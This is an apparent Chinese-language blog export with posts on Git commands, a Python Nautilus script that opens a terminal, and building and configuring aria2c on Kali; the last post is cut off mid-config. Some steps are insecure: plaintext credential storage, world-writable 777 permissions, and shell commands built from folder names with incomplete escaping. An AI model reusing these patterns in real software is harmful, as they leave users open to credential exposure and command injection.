class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch aria2c' --prune-empty --tag-name-filter cat -- --all</span><br><span class="line"></span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「Mr.True」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https://blog.csdn.net/q258523454/article/details/83899911</span><br></pre></td></tr></table></figure><p>然后再提交就没问题了。</p><p>顺便解决使用<code>https</code>协议推送<code>github</code>时，每次都需要输入账号密码的问题：</p><p>在项目目录下输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global credential.helper store</span><br></pre></td></tr></table></figure><p>这样当你下一次输入账号密码之后，就会在本地保存你的账号密码，就不用每次都输入了。</p><h2 id="分支管理"><a class="header-anchor" href="#分支管理"></a>分支管理</h2><h3 id="分支的概念"><a class="header-anchor" href="#分支的概念"></a>分支的概念</h3><blockquote><p>假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了50%的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人不能干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。</p><p>现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</p></blockquote><h3 id="创建与合并分支"><a class="header-anchor" href="#创建与合并分支"></a>创建与合并分支</h3><p>在<code>Git</code>中，<code>HEAD</code>指向的分支就是当前分支，<code>master</code>分支是要提交的主分支。</p><p>每次提交，<code>master</code>分支都会向前移动一步，这样，随着你不断提交，<code>master</code>分支的线也越来越长。</p><p>当我们创建新的分支，例如<code>dev</code>时，Git新建了一个指针叫<code>dev</code>，指向<code>master</code>相同的提交，再把<code>HEAD</code>指向<code>dev</code>，就表示当前分支在<code>dev</code>上。</p><p>每次<code>commit</code>之后，<code>HEAD</code>指向的分支会向前推进一步，我们只需要在需要的地方开启新的分支，然后在新分支上继续开发，等到开发完毕，再合并回<code>master</code>分支即可。</p><p>在原来的分支上创建dev分支：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b dev</span><br></pre></td></tr></table></figure><p><code>git checkout</code>命令加上<code>-b</code>参数表示创建并切换，相当于以下两条命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git branch dev</span><br><span class="line">$ git checkout dev</span><br><span class="line">Switched to branch &#39;dev&#39;</span><br></pre></td></tr></table></figure><p>然后，用<code>git branch</code>命令查看当前分支：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* dev</span><br><span class="line">  master</span><br></pre></td></tr></table></figure><p><code>git branch</code>命令会列出所有分支，当前分支前面会标一个<code>*</code>号。</p><p>然后我们可以在dev分支上继续开发，开发完成之后commit，此时改动并不会被同步到maser分支上。</p><p>如果需要将dev分支合并回master分支，<strong>在master分支下</strong>使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge dev</span><br></pre></td></tr></table></figure><p><code>git merge</code>命令用于合并指定分支到当前分支。合并后，再查看<code>readme.txt</code>的内容，就可以看到，和<code>dev</code>分支的最新提交是完全一样的。</p><p>注意到上面的<code>Fast-forward</code>信息，Git告诉我们，这次合并是“快进模式”，也就是直接把<code>master</code>指向<code>dev</code>的当前提交，所以合并速度非常快。</p><p>除了<code>Fast-forward</code>之外，也还有其他的合并方式。</p><p>合并完成之后，就可以删除dev分支了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d dev</span><br></pre></td></tr></table></figure><p>删除后，查看<code>branch</code>，就只剩下<code>master</code>分支了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* master</span><br></pre></td></tr></table></figure><p><strong>分支管理相关命令：</strong></p><p>查看分支：<code>git branch</code></p><p>创建分支：<code>git branch </code></p><p>切换分支：<code>git checkout </code>或者<code>git switch </code></p><p>创建+切换分支：<code>git checkout -b </code>或者<code>git switch -c </code></p><p>合并某分支到当前分支：<code>git merge </code></p><p>删除分支：<code>git branch -d </code></p><h3 id="解决分支冲突"><a class="header-anchor" href="#解决分支冲突"></a>解决分支冲突</h3><p>这是很常见的一种情况，当两个分支分别开发，合并的时候，难免会遇到改动冲突的时候，这时候就不能直接合并，而是需要手动解决了冲突之后才能合并成功。</p><p>准备新的<code>feature1</code>分支，继续我们的新分支开发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git switch -c feature1</span><br><span class="line">Switched to a new branch &#39;feature1&#39;</span><br></pre></td></tr></table></figure><p>在feature1分支中对本文进行修改，然后<code>commit</code>。</p><p>然后切换回<code>master</code>分支中修改，并<code>commit</code>。</p><p>这样，<code>master</code>分支和<code>feature1</code>分支各自都分别有新的提交，这种情况下，Git无法执行“快速合并”，只能试图把各自的修改合并起来，但这种合并就可能会有冲突，所以当我们执行<code>git merge</code>的时候，<code>Git</code>会提示冲突，并让我们手动解决冲突的文件后再合并。</p><p>此时文件中会将两个分支的改动都写入并标注出来，我们只需要手动将两个分支的改动按照需要修改，再<code>git commit</code>即可。</p><p>这个时候，由于我们手动解决了冲突，并commit了，所以当前分支的版本较另一分支新，所以我们再合并的话就不会提示冲突了。</p><p>最后，删除<code>feature1</code>分支即可。</p><h3 id="merge-no-ff"><a class="header-anchor" href="#merge-no-ff"></a>merge <code>--no-ff</code></h3><p>合并分支的时候，Git会默认使用<code>Fast forward</code>模式，但这种模式下，删除分支后，会丢掉分支信息。</p><p>如果要强制禁用<code>Fast forward</code>模式，<code>Git</code>就会在<code>merge</code>时生成一个新的<code>commit</code>，这样，从分支历史上就可以看出分支信息。</p><p>对于dev分支，<code>Fast forward</code>模式合并情况：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/image-20200222194330670.png" alt="image-20200222194330670.png"></p><p>加参数<code>--no-ff</code>时的分支合并情况：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/0.png" alt="0"></p><h3 id="分支管理策略"><a class="header-anchor" href="#分支管理策略"></a>分支管理策略</h3><p>在实际开发中，我们应该按照几个基本原则进行分支管理：</p><p>首先，<code>master</code>分支应该是非常稳定的，也就是仅用来发布新版本，<strong>平时不能在上面干活</strong>；</p><p>那在哪干活呢？干活都在<code>dev</code>分支上，也就是说，<code>dev</code>分支是不稳定的，到某个时候，比如1.0版本发布时，再把<code>dev</code>分支合并到<code>master</code>上，在<code>master</code>分支发布1.0版本；</p><p>你和你的小伙伴们每个人都在<code>dev</code>分支上干活，每个人都有自己的分支，时不时地往<code>dev</code>分支上合并就可以了。</p><p>所以，团队合作的分支看起来就像这样：</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/2.png" alt="2"></p><h3 id="bug分支"><a class="header-anchor" href="#bug分支"></a>bug分支</h3><h4 id="git-stash："><a class="header-anchor" href="#git-stash："></a><code>git stash</code>：</h4><p>假如目前还有未完成的开发工作，但是临时需要新开一个分支来处理<code>bug</code>，<code>git</code>提供了<code>stash</code>的功能，可以把当前的工作现场储存起来，等以后恢复现场后继续工作。</p><p><code>git stash</code>之后，当前暂存区的内容会被暂时储存起来，可以使用<code>git stash list</code>查看，恢复的命令如下：</p><p><code>git stash apply</code>：恢复后，stash内容并不删除，你需要用<code>git stash drop</code>来删除；</p><p><code>git stash pop</code>：恢复的同时stash内容也会被删除。</p><p>也可以多次stash，恢复的时候，先用<code>git stash list</code>查看，然后恢复指定的stash，用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git stash apply stash@&#123;0&#125;</span><br></pre></td></tr></table></figure><h4 id="git-cherry-pick："><a class="header-anchor" href="#git-cherry-pick："></a><code>git cherry-pick</code>：</h4><p>假如目前发现了<code>bug</code>，然后新开了个分支<code>fix1</code>修复了，并且<code>commit</code>到了<code>master</code>分支，但是<code>dev</code>分支是在<code>bug</code>修复前开的，要想将<code>dev</code>分支的<code>bug</code>也修复了，就需要将<code>fix1</code>提交的改动复制到<code>dev</code>分支。</p><p>为了方便操作，Git专门提供了一个<code>cherry-pick</code>命令，让我们能复制一个特定的提交到当前分支：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git cherry-pick &lt;commit id&gt;</span><br></pre></td></tr></table></figure><blockquote><p><code>Git</code>自动给<code>dev</code>分支做了一次提交，注意这次提交的<code>commit</code>是<code>1d4b803</code>，它并不同于<code>master</code>的<code>4c805e2</code>，因为这两个<code>commit</code>只是改动相同，但确实是两个不同的<code>commit</code>。用<code>git cherry-pick</code>，我们就不需要在<code>dev</code>分支上手动再把修bug的过程重复一遍。</p><p>有些聪明的童鞋会想了，既然可以在<code>master</code>分支上修复<code>bug</code>后，在<code>dev</code>分支上可以“重放”这个修复过程，那么直接在<code>dev</code>分支上修复<code>bug</code>，然后在<code>master</code>分支上“重放”行不行？当然可以，不过你仍然需要<code>git stash</code>命令保存现场，才能从<code>dev</code>分支切换到<code>master</code>分支。</p></blockquote><h3 id="feature分支"><a class="header-anchor" href="#feature分支"></a>feature分支</h3><p>当需要添加一些实验性质的代码时，又不希望将<code>master</code>分支搞乱，所以我们需要新开一个<code>”feature“</code>分支。</p><p>首先我们的开发都是在<code>dev</code>分支下，所以<code>feature</code>分支是在<code>dev</code>分支下新开的，则会继承<code>dev</code>分支的改动。</p><p>在新开的<code>feature</code>分支上完成开发后，一切顺利的话我们可以合并到<code>dev</code>分支，然后合并到<code>master</code>分支，完成改动。但是如果发生问题，我们在<code>feature</code>分支下完成的开发需要被放弃，那我们可以直接删除<code>feature</code>分支。</p><p>执行<code>git branch -d feature</code>，Git会提示销毁失败，feature分支还没有被合并，所以我们需要用<code>git branch -D feature</code>强制删除。</p><p>feature分支的需求本质是需要删除一个还没有被合并的新分支，使用<code>git branch -D</code>。</p><p>这里还有一个小知识点：<strong>没有commit的情况下，暂存区中的内容不属于任何一个分支。</strong></p><h3 id="多人协作"><a class="header-anchor" href="#多人协作"></a>多人协作</h3><p>多人协作时，需要同步的分支有两个，一个是<code>master</code>分支，一个是<code>dev</code>分支。当有新需求的时候，每个组员都开新分支解决需求，然后合并到<code>dev</code>分支中。<code>dev</code>分支是用来同步开发进度的，一般情况下，<code>master</code>分支只发布经过严格测试之后的版本，且需要专人从<code>dev</code>分支中合并，以免污染<code>master</code>分支。</p><p>当远程的版本比本地新的时候，需要用<code>git pull</code>抓取远程版本，然后在本地合并。</p><ul><li>查看远程库信息，使用<code>git remote -v</code>；</li><li>本地新建的分支如果不推送到远程，对其他人就是不可见的；</li><li>从本地推送分支，使用<code>git push origin branch-name</code>，如果推送失败，先用<code>git pull</code>抓取远程的新提交；</li><li>在本地创建和远程分支对应的分支，使用<code>git checkout -b branch-name origin/branch-name</code>，本地和远程分支的名称最好一致；</li><li>建立本地分支和远程分支的关联，使用<code>git branch --set-upstream branch-name origin/branch-name</code>；</li><li>从远程抓取分支，使用<code>git pull</code>，如果有冲突，要先处理冲突。</li></ul><h3 id="Rebase"><a class="header-anchor" href="#Rebase"></a>Rebase</h3><p>多人在同一个分支上协作时，很容易出现冲突。即使没有冲突，后push的童鞋不得不先pull，在本地合并，然后才能push成功。</p><h4 id="Rebase的使用情景："><a class="header-anchor" href="#Rebase的使用情景："></a><code>Rebase</code>的使用情景：</h4><p>假如此时本地进行了修改，然后当你<code>push</code>到远程的时候，有人先你一步<code>push</code>了，你需要先<code>git pull</code>，合并远程的提交，然后再push。但是此时你的<code>git log</code>会增加一个远程pull下来的<code>commit</code>，然后和本地新增的部分形成一个提交历史的分叉，就像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">*   e0ea545 (HEAD -&gt; master) Merge branch &#39;master&#39; of github.com:michaelliao&#x2F;learngit</span><br><span class="line">|\  </span><br><span class="line">| * f005ed4 (origin&#x2F;master) set exit&#x3D;1# pull下来的别人的commit</span><br><span class="line">* | 582d922 add author# 本地commit1</span><br><span class="line">* | 8875536 add comment# 本地commit2</span><br><span class="line">|&#x2F;  </span><br><span class="line">* d1be385 init hello# 远程库HEAD</span><br></pre></td></tr></table></figure><p>要想将分叉变成一条直线，执行命令<code>git rebase</code>，就可以将弯的变直了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">* 7e61ed4 (HEAD -&gt; master) add author</span><br><span class="line">* 3611cfe add comment</span><br><span class="line">* f005ed4 (origin&#x2F;master) set exit&#x3D;1</span><br><span class="line">* d1be385 init hello</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>实际上是将本地的两次提交和远程pull下来的提交交换了位置，然后提交历史就变成了一条直线，使得查看起来更直观。</p><p>然后再push，再用<code>git log</code>看看效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git log --graph --pretty&#x3D;oneline --abbrev-commit</span><br><span class="line">* 7e61ed4 (HEAD -&gt; master, origin&#x2F;master) add author</span><br><span class="line">* 3611cfe add comment</span><br><span class="line">* f005ed4 set exit&#x3D;1</span><br><span class="line">* d1be385 init hello</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>远程的提交历史也变直了。</p><h3 id="标签（tag）"><a class="header-anchor" href="#标签（tag）"></a>标签（tag）</h3><p><code>tag</code>相当于某次<code>commit</code>的别名，为了下次找到某次<code>commit</code>时更方便而设立的。</p><p>例：<code>git tag v1.0</code></p><p>默认标签是打在最新提交的<code>commit</code>上的，如果要为选定的<code>commit</code>打<code>tag</code>，则使用对应的<code>commit id</code>。</p><p>例：<code>git tag v0.9 f52c633</code></p><p>查看所有标签：<code>git tag</code></p><p>查看标签信息：<code>git show &lt;tagname&gt;</code></p><p>创建带有说明的标签，用<code>-a</code>指定标签名，<code>-m</code>指定说明文字：</p><p><code>git tag -a v0.1 -m &quot;version 0.1 released&quot; 1094adb</code></p><p>删除标签：<code>git tag -d &lt;tagname&gt;</code></p><p>推送某个标签到远程：<code>git push origin &lt;tagname&gt;</code></p><p>一次性推送全部尚未推送到远程的本地标签：<code>git push origin --tags</code></p><p>删除远程标签：先从本地删除（<code>git tag -d</code>），然后从远程删除（<code>git push origin :refs/tags/v0.9</code>）</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nautilus脚本添加terminal快捷方式</title>
      <link href="/p/89ad866.html"/>
      <url>/p/89ad866.html</url>
      
        <content type="html"><![CDATA[<p><code>Nautilus</code> 是<code>gnome</code>桌面环境的文件管理器，但是功能还是比较有限，作为一个经常在windows下写代码的人，对windows文件管理器的快捷方式很受用。</p><p>虽然<code>nautilus</code>也可以右键选择”在终端打开“，但是只能在窗口的空白处点击右键才有这个选项，一旦光标选中了文件或文件夹，右键菜单中就没有“在终端打开”的选项了。</p><p>如果文件太多，已经填满了窗口的情况下，根本就不可能调出这个菜单了，所以只能手动复制路径，然后在终端中<code>cd</code>过去，既影响效率又影响心情。</p><a id="more"></a><h3 id="目标"><a class="header-anchor" href="#目标"></a>目标</h3><p>实现在文件管理器任意界面按下快捷键，打开终端并定位到此处。</p><h3 id="0x00"><a class="header-anchor" href="#0x00"></a>0x00</h3><p><code>Nautilus</code>本身没有提供这样的接口，但是可以直接运行<code>nautilus脚本</code>，只需要将任意可运行脚本放到<br><code>/root/.local/share/nautilus/scripts</code>文件夹下，然后在文件管理界面下点击右键，就可以在菜单中找到脚本选项了，然后选择对应的脚本就可以运行了。</p><h3 id="0x01-制作脚本"><a class="header-anchor" href="#0x01-制作脚本"></a>0x01 制作脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;.local&#x2F;share&#x2F;nautilus&#x2F;scripts</span><br><span class="line">vim Terminal</span><br></pre></td></tr></table></figure><p>然后添加以下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Author: guiu</span></span><br><span class="line"><span class="string">一个nautilus脚本，用来使用快捷键在当前文件夹下打开terminal</span></span><br><span class="line"><span class="string">需要配合/root/.config/nautilus/scripts-accels文件使用</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 获取当前路径并url解码</span></span><br><span class="line">    current_path = os.getenv(<span class="string">"NAUTILUS_SCRIPT_CURRENT_URI"</span>)[<span class="number">7</span>:]</span><br><span class="line">    current_path = parse.unquote(current_path)</span><br><span class="line">    current_path = current_path.replace(<span class="string">' '</span>, <span class="string">'\ '</span>).replace(<span class="string">'('</span>, <span class="string">'\('</span>).replace(<span class="string">')'</span>, <span class="string">'\)'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果有选中文件的情况下，获取选中文件路径</span></span><br><span class="line">    select_file_path = os.getenv(<span class="string">"NAUTILUS_SCRIPT_SELECTED_FILE_PATHS"</span>).splitlines()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> select_file_path:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> select_file_path:</span><br><span class="line">            <span class="comment"># 如果选中的路径是文件</span></span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(i):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                open_path = i.replace(<span class="string">' '</span>, <span class="string">'\ '</span>).replace(<span class="string">'('</span>, <span class="string">'\('</span>).replace(<span class="string">')'</span>, <span class="string">'\)'</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 如果选中的路径中含有文件夹，则打开第一个</span></span><br><span class="line">            <span class="keyword">if</span> open_path:</span><br><span class="line">                os.system(<span class="string">"gnome-terminal --working-directory=&#123;&#125;"</span>.format(open_path))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment"># 选中的全是文件，则打开当前目录</span></span><br><span class="line">            os.system(<span class="string">"gnome-terminal --working-directory=&#123;&#125;"</span>.format(current_path))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 没有选中对象，打开当前目录</span></span><br><span class="line">        os.system(<span class="string">"gnome-terminal --working-directory=&#123;&#125;"</span>.format(current_path))</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这个脚本的功能是，当前如果有选中文件夹，就打开选中的第一个文件夹，如果没有，就打开当前目录。</p><h3 id="0x02-绑定快捷方式"><a class="header-anchor" href="#0x02-绑定快捷方式"></a>0x02 绑定快捷方式</h3><p>此时就可以在右键菜单里选中脚本打开<code>terminal</code>了。</p><p>下面我们给这个脚本绑定快捷键：</p><p>查遍了资料都没人提到如何创建快捷键，最后在某角落里看到了相关的介绍，终于解决了这个问题。</p><p>首先在<code>/root/.config/nautilus/</code>文件夹下创建<code>scripts-accels</code>文件，填入以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">F12 Terminal</span><br><span class="line"></span><br><span class="line">; Commented lines must have a space after the semicolon</span><br><span class="line">; Examples of other key combinations:</span><br><span class="line">; &lt;Control&gt;F12 Terminal</span><br><span class="line">; &lt;Alt&gt;F12 Terminal</span><br><span class="line">; &lt;Shift&gt;F12 Terminal</span><br></pre></td></tr></table></figure><p>这个脚本是将<code>Terminal</code>脚本绑定到<code>F12</code>快捷键上，然后保存退出即可。</p>]]></content>
      
      
      <categories>
          
          <category> 折腾纪实 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> gnome </tag>
            
            <tag> nautilus </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali安装 Camtd + Aria2c小记</title>
      <link href="/p/a17011ed.html"/>
      <url>/p/a17011ed.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-编译安装Aria2c"><a class="header-anchor" href="#0x00-编译安装Aria2c"></a>0x00 编译安装Aria2c</h2><h3 id="编译安装Aria2"><a class="header-anchor" href="#编译安装Aria2"></a>编译安装Aria2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libxml2-dev libcppunit-dev autoconf automake autotools-dev autopoint libtool</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/aria2/aria2.git</span><br><span class="line"><span class="built_in">cd</span> aria2</span><br><span class="line">autoreconf -i</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>然后等待编译完成，中间无报错即可，这时候就安装完成了。</p><p>编译完成的二进制文件在<code>aria2/src/aria2c</code></p><a id="more"></a><p>检查是否安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali-guiu:~/aria2<span class="comment"># aria2c</span></span><br><span class="line">Specify at least one URL.</span><br><span class="line">Usage: aria2c [OPTIONS] [URI | MAGNET | TORRENT_FILE | METALINK_FILE]...</span><br><span class="line">See <span class="string">'aria2c -h'</span>.</span><br></pre></td></tr></table></figure><h2 id="0x01-配置Aria2"><a class="header-anchor" href="#0x01-配置Aria2"></a>0x01 配置Aria2</h2><h3 id="创建下载目录"><a class="header-anchor" href="#创建下载目录"></a>创建下载目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/aria2c_download</span><br><span class="line">chmod 777 ~/aria2c_download</span><br></pre></td></tr></table></figure><h3 id="创建配置文件"><a class="header-anchor" href="#创建配置文件"></a>创建配置文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建配置文件存放目录</span></span><br><span class="line">mkdir /etc/aria2</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建会话文件（存放下载信息）</span></span><br><span class="line">touch /etc/aria2/aria2.session</span><br><span class="line">chmod 777 /etc/aria2/aria2.session</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建配置文件</span></span><br><span class="line">vim /etc/aria2/aria2.conf</span><br></pre></td></tr></table></figure><p>在<code>aria2.conf</code>中写入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 全局设置 ## ============================================================</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 日志</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">log</span>-level=warn</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">log</span>=/PATH/.aria2/aria2.log</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 后台运行</span></span><br><span class="line">daemon=true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载位置, 默认: 当前启动位置</span></span><br><span class="line">dir=/home/aria2c_download</span><br><span class="line"></span><br><span 